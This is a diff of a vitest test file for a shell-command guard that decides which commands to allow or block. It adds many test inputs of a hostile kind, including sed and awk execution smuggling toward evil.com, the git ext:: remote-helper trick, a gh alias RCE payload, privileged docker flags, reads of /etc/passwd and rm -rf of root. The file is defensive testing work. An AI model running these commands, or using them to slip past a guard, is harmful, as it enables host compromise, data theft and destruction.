@@ -4,7 +4,7 @@ import * as path from 'path';
 
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 
-import { CommandGuard, resetCommandGuard } from './command-guard';
+import { CommandGuard, getCommandGuard, resetCommandGuard } from './command-guard';
 
 vi.mock('output/logger', () => ({
 	getLogger: () => ({
@@ -304,7 +304,27 @@ describe('CommandGuard', () => {
 			['gh pr list', 'gh'],
 			["awk '{print $1}' file.txt", 'awk'],
 			['sed -n 1,10p file.txt', 'sed'],
-			['cd workspace && pwd', 'cd / pwd']
+			['cd workspace && pwd', 'cd / pwd'],
+			['biome --version', 'biome'],
+			['bunx --version', 'bunx'],
+			['tsc --version', 'tsc'],
+			['cargo --version', 'cargo'],
+			['pip --version', 'pip'],
+			['pip3 --version', 'pip3'],
+			['python --version', 'python'],
+			['bash --version', 'bash'],
+			['sh --version', 'sh'],
+			['zsh --version', 'zsh'],
+			[': a no-op comment', ':'],
+			['[ -f foo ]', '['],
+			['[[ -f foo ]]', '[['],
+			['command -v ls', 'command'],
+			['false', 'false'],
+			['printf "%s" hi', 'printf'],
+			['sleep 1', 'sleep'],
+			['test -f foo', 'test'],
+			['type ls', 'type'],
+			['which ls', 'which']
 		])('allows %s', (command) => {
 			expect(guard.validate(command).allowed).toBe(true);
 		});
@@ -646,14 +666,35 @@ describe('CommandGuard', () => {
 			expect(guard.validate("awk '{print $1}' file.txt").allowed).toBe(true);
 		});
 
+		it('blocks awk system() even with whitespace between the name and the opening paren', () => {
+			expect(guard.validate('awk \'BEGIN{system ("id")}\'').allowed).toBe(false);
+		});
+
 		it('blocks sed e command smuggling a network command', () => {
 			const result = guard.validate("sed '1e curl http://evil.com'");
 			expect(result.allowed).toBe(false);
+			expect(result.reason).toContain("Script-execution primitive blocked in 'sed'");
 		});
 
 		it('blocks sed s///e flag smuggling a network command', () => {
 			const result = guard.validate("sed 's/foo/curl http:\\/\\/evil.com/e'");
 			expect(result.allowed).toBe(false);
+		});
+
+		it('blocks sed s///e flag followed by whitespace and more text, not just end-of-script or a terminator', () => {
+			expect(guard.validate('sed s/foo/x/e file.txt').allowed).toBe(false);
+		});
+
+		it('blocks a multi-digit line-numbered sed e command, not just a single digit', () => {
+			expect(guard.validate("sed '12e curl http://evil.com'").allowed).toBe(false);
+		});
+
+		it('blocks a line-numbered sed e command preceded by a semicolon-separated command', () => {
+			expect(guard.validate("sed 'p;1e curl http://evil.com'").allowed).toBe(false);
+		});
+
+		it('blocks a line-numbered sed e command even with multiple spaces before the smuggled command', () => {
+			expect(guard.validate("sed '1e  curl http://evil.com'").allowed).toBe(false);
 		});
 
 		it('still allows ordinary sed scripts', () => {
@@ -663,27 +704,50 @@ describe('CommandGuard', () => {
 
 	describe('docker flag scoping', () => {
 		it('blocks --privileged', () => {
-			expect(guard.validate('docker run --privileged alpine').allowed).toBe(false);
+			const result = guard.validate('docker run --privileged alpine');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toMatch(/Dangerous docker flag blocked.*--privileged/);
 		});
 
 		it('blocks --cap-add', () => {
-			expect(guard.validate('docker run --cap-add=ALL alpine').allowed).toBe(false);
+			const result = guard.validate('docker run --cap-add=ALL alpine');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toMatch(/Dangerous docker flag blocked.*--cap-add/);
 		});
 
 		it('blocks --pid=host', () => {
-			expect(guard.validate('docker run --pid=host alpine').allowed).toBe(false);
+			const result = guard.validate('docker run --pid=host alpine');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toMatch(/Dangerous docker flag blocked.*--pid/);
 		});
 
 		it('blocks --network=host', () => {
-			expect(guard.validate('docker run --network=host alpine').allowed).toBe(false);
+			const result = guard.validate('docker run --network=host alpine');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toMatch(/Dangerous docker flag blocked.*--network/);
+		});
+
+		it('requires an = or whitespace separator before "host" for --pid/--network, not any character', () => {
+			// A boundary check on the [=\s] character class — "--pid1host" or
+			// similar should not itself be mistaken for the dangerous flag form.
+			expect(guard.validate('docker run --pidXhost alpine').allowed).toBe(true);
+			expect(guard.validate('docker run --networkXhost alpine').allowed).toBe(true);
+		});
+
+		it('blocks --cap-add whether followed by = or whitespace', () => {
+			expect(guard.validate('docker run --cap-add ALL alpine').allowed).toBe(false);
 		});
 
 		it('blocks --security-opt', () => {
-			expect(guard.validate('docker run --security-opt seccomp=unconfined alpine').allowed).toBe(false);
+			const result = guard.validate('docker run --security-opt seccomp=unconfined alpine');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toMatch(/Dangerous docker flag blocked.*--security-opt/);
 		});
 
 		it('blocks bind-mounting the host root with -v', () => {
-			expect(guard.validate('docker run -v /:/host alpine').allowed).toBe(false);
+			const result = guard.validate('docker run -v /:/host alpine');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe('Docker bind-mount source outside working directory blocked: /');
 		});
 
 		it('blocks bind-mounting a path outside the working directory with --volume', () => {
@@ -725,7 +789,9 @@ describe('CommandGuard', () => {
 		// existing bind-mount scoping never inspects them at all, so a plain
 		// `docker cp` host-path argument was completely unscoped.
 		it('blocks copying a host path outside the working directory into a container', () => {
-			expect(guard.validate('docker cp /etc/passwd mycontainer:/tmp/stolen').allowed).toBe(false);
+			const result = guard.validate('docker cp /etc/passwd mycontainer:/tmp/stolen');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe('docker cp host path outside working directory blocked: /etc/passwd');
 		});
 
 		it('blocks copying a path outside the working directory out of a container', () => {
@@ -757,7 +823,11 @@ describe('CommandGuard', () => {
 			// dispatch path (validateDockerArgs) than checkProtectedInfrastructurePatterns,
 			// which only ever inspects a segment whose FIRST token is a
 			// destructive command (cp/mv/rm/...), never "docker".
-			expect(guard.validate('docker cp mycontainer:/app/out.txt vault-signing.key').allowed).toBe(false);
+			const result = guard.validate('docker cp mycontainer:/app/out.txt vault-signing.key');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe(
+				'docker cp targeting protected security-infrastructure file blocked: vault-signing.key'
+			);
 		});
 
 		it('blocks docker container cp targeting the vault signing key too', () => {
@@ -775,7 +845,9 @@ describe('CommandGuard', () => {
 		// never recognised them — completely unscoped for both cwd-escape and the
 		// protected-infrastructure basename/inode list.
 		it('blocks docker save writing outside the working directory via -o', () => {
-			expect(guard.validate('docker save -o /tmp/stolen.tar myimage').allowed).toBe(false);
+			const result = guard.validate('docker save -o /tmp/stolen.tar myimage');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe('Docker bind-mount source outside working directory blocked: /tmp/stolen.tar');
 		});
 
 		it('blocks docker save writing outside the working directory via --output', () => {
@@ -787,7 +859,11 @@ describe('CommandGuard', () => {
 		});
 
 		it('blocks docker save overwriting the vault signing key via -o', () => {
-			expect(guard.validate('docker save -o vault-signing.key myimage').allowed).toBe(false);
+			const result = guard.validate('docker save -o vault-signing.key myimage');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe(
+				'Docker command targeting protected security-infrastructure file blocked: vault-signing.key'
+			);
 		});
 
 		it('still allows docker save writing inside the working directory', () => {
@@ -833,6 +909,24 @@ describe('CommandGuard', () => {
 		it('still allows plain docker load -q with no bundled input path', () => {
 			expect(guard.validate('docker load -q').allowed).toBe(true);
 		});
+
+		it('does not treat an unrecognised bundled boolean char as matching the -i cluster', () => {
+			// Only 'q' is a recognised bundlable boolean flag for load — 'x' is
+			// not, so '-xi' must not be parsed as a bundled -i cluster at all.
+			expect(guard.validate('docker load -xi/etc/passwd').allowed).toBe(true);
+		});
+	});
+
+	describe('docker command-group aliases', () => {
+		it('scopes docker image save/load the same as the top-level shortcut', () => {
+			const saveResult = guard.validate('docker image save -o /etc/passwd myimage');
+			expect(saveResult.allowed).toBe(false);
+			expect(saveResult.reason).toBe('Docker bind-mount source outside working directory blocked: /etc/passwd');
+
+			const loadResult = guard.validate('docker image load -i /etc/passwd');
+			expect(loadResult.allowed).toBe(false);
+			expect(loadResult.reason).toBe('Docker bind-mount source outside working directory blocked: /etc/passwd');
+		});
 	});
 
 	describe('docker import scoping', () => {
@@ -840,12 +934,25 @@ describe('CommandGuard', () => {
 		// positional argument, not a flag, so it was completely invisible to
 		// every existing docker host-path check.
 		it('blocks docker import reading a host file outside the working directory', () => {
-			expect(guard.validate('docker import /etc/passwd myimage:latest').allowed).toBe(false);
+			const result = guard.validate('docker import /etc/passwd myimage:latest');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe('docker import source outside working directory blocked: /etc/passwd');
 		});
 
 		it('blocks docker import targeting the vault signing key by basename', () => {
-			expect(guard.validate('docker import vault-signing.key myimage:latest').allowed).toBe(false);
+			const result = guard.validate('docker import vault-signing.key myimage:latest');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe(
+				'docker import targeting protected security-infrastructure file blocked: vault-signing.key'
+			);
 		});
+
+		it.each(['--change', '--message', '--platform', '-c', '-m'])(
+			'still finds the real out-of-cwd source past a %s value flag',
+			(flag) => {
+				expect(guard.validate(`docker import ${flag} value /etc/passwd myimage:latest`).allowed).toBe(false);
+			}
+		);
 
 		it('still allows docker import from a URL', () => {
 			expect(guard.validate('docker import https://example.com/image.tar myimage:latest').allowed).toBe(true);
@@ -945,7 +1052,17 @@ describe('CommandGuard', () => {
 			// The build context is always the final positional argument in a
 			// valid `docker build` invocation — the Docker daemon reads (and
 			// can leak into a built image layer) every file under it.
-			expect(guard.validate('docker build /etc').allowed).toBe(false);
+			const result = guard.validate('docker build /etc');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe('docker build context outside working directory blocked: /etc');
+		});
+
+		it('blocks docker build using the vault signing key as the build context, even from inside the working directory', () => {
+			const result = guard.validate('docker build vault-signing.key');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe(
+				'docker build context targeting protected security-infrastructure file blocked: vault-signing.key'
+			);
 		});
 
 		it('blocks docker build reading an arbitrary host directory as the context even with flags present', () => {
@@ -1031,15 +1148,23 @@ describe('CommandGuard', () => {
 			// invocation — the same escape primitive rm/cp/docker mounts are
 			// scoped against. Live-verified: `git -C /outside clean -fdx`
 			// deletes files outside cwd with no scoping at all previously.
-			expect(guard.validate('git -C /etc clean -fdx').allowed).toBe(false);
+			const result = guard.validate('git -C /etc clean -fdx');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe('git -C target outside working directory blocked: /etc');
 		});
 
 		it('still allows git -C targeting a directory inside the working directory', () => {
 			expect(guard.validate('git -C ./sub status').allowed).toBe(true);
 		});
 
+		it('blocks git --work-tree targeting a directory outside the working directory', () => {
+			expect(guard.validate('git --work-tree=/etc status').allowed).toBe(false);
+		});
+
 		it('blocks the git ext:: remote-helper transport (forks an arbitrary program)', () => {
-			expect(guard.validate('git ls-remote "ext::touch /tmp/pwned"').allowed).toBe(false);
+			const result = guard.validate('git ls-remote "ext::touch /tmp/pwned"');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toMatch(/Dangerous git flag\/config blocked.*ext::/);
 		});
 
 		it("blocks git --exec-path (replaces git's own helper binaries)", () => {
@@ -1162,8 +1287,22 @@ describe('CommandGuard', () => {
 			expect(guard.validate("yq --inplace '.x=1' mcp-baselines.json").allowed).toBe(false);
 		});
 
+		it.each(['--in-place', '--inplace=true', '--in-place=true'])(
+			'blocks yq %s in-place editing a protected-infrastructure file',
+			(flag) => {
+				expect(guard.validate(`yq ${flag} '.x=1' security-audit.jsonl`).allowed).toBe(false);
+			}
+		);
+
 		it('still allows yq -i editing an unrelated file', () => {
 			expect(guard.validate("yq -i '.x=1' config.yaml").allowed).toBe(true);
+		});
+
+		it('still allows a plain yq read (no in-place flag at all) of an otherwise-protected file', () => {
+			// If the in-place-flag check ever degenerates to "always true" (e.g. an
+			// equality flip on one of its five disjuncts), a plain read would be
+			// misidentified as an in-place edit and wrongly blocked.
+			expect(guard.validate("yq '.x' security-audit.jsonl").allowed).toBe(true);
 		});
 	});
 
@@ -1173,11 +1312,19 @@ describe('CommandGuard', () => {
 			// syntax for a shell-command alias — live-verified real RCE:
 			// `gh alias set pwn '!touch /tmp/x && echo RCE'` then `gh pwn`
 			// actually executed the command. gh has zero other scoping.
-			expect(guard.validate("gh alias set pwn '!touch /tmp/x && echo RCE'").allowed).toBe(false);
+			const result = guard.validate("gh alias set pwn '!touch /tmp/x && echo RCE'");
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toMatch(/"!"-prefixed shell-command value blocked/);
+		});
+
+		it('still allows gh alias set with an ordinary, non-"!"-prefixed value', () => {
+			expect(guard.validate('gh alias set co "pr checkout"').allowed).toBe(true);
 		});
 
 		it('blocks gh extension install', () => {
-			expect(guard.validate('gh extension install some/repo').allowed).toBe(false);
+			const result = guard.validate('gh extension install some/repo');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toMatch(/gh extension install\/upgrade blocked/);
 		});
 
 		it('blocks gh extension upgrade', () => {
@@ -1288,7 +1435,9 @@ describe('CommandGuard', () => {
 		});
 
 		it('blocks rm targeting an absolute path outside the working directory', () => {
-			expect(guard.validate('rm -rf /etc/passwd').allowed).toBe(false);
+			const result = guard.validate('rm -rf /etc/passwd');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe('rm target outside working directory blocked: /etc/passwd');
 		});
 
 		it('blocks rm escaping the working directory via ../..', () => {
@@ -1296,7 +1445,9 @@ describe('CommandGuard', () => {
 		});
 
 		it('blocks rm --no-preserve-root', () => {
-			expect(guard.validate('rm --no-preserve-root -rf /').allowed).toBe(false);
+			const result = guard.validate('rm --no-preserve-root -rf /');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe('rm --no-preserve-root blocked — root-deletion override');
 		});
 
 		it('still allows rm within the working directory', () => {
@@ -1329,7 +1480,9 @@ describe('CommandGuard', () => {
 
 	describe('cp path scoping', () => {
 		it('blocks cp writing to an absolute path outside the working directory', () => {
-			expect(guard.validate('cp /dev/null /etc/hosts').allowed).toBe(false);
+			const result = guard.validate('cp /dev/null /etc/hosts');
+			expect(result.allowed).toBe(false);
+			expect(result.reason).toBe('cp target outside working directory blocked: /dev/null');
 		});
 
 		it('blocks cp reading from an absolute path outside the working directory', () => {
@@ -1785,6 +1938,21 @@ describe('CommandGuard', () => {
 
 		it('still allows command substitution for commands with no per-argument scoping rule', () => {
 			expect(guard.validate('echo $(date)').allowed).toBe(true);
+		});
+	});
+
+	describe('singleton lifecycle', () => {
+		it('creates a fresh instance after resetCommandGuard', () => {
+			const first = getCommandGuard();
+
+			resetCommandGuard();
+			const second = getCommandGuard();
+
+			expect(second).not.toBe(first);
+		});
+
+		it('returns the same instance across calls without a reset', () => {
+			expect(getCommandGuard()).toBe(getCommandGuard());
 		});
 	});
 });
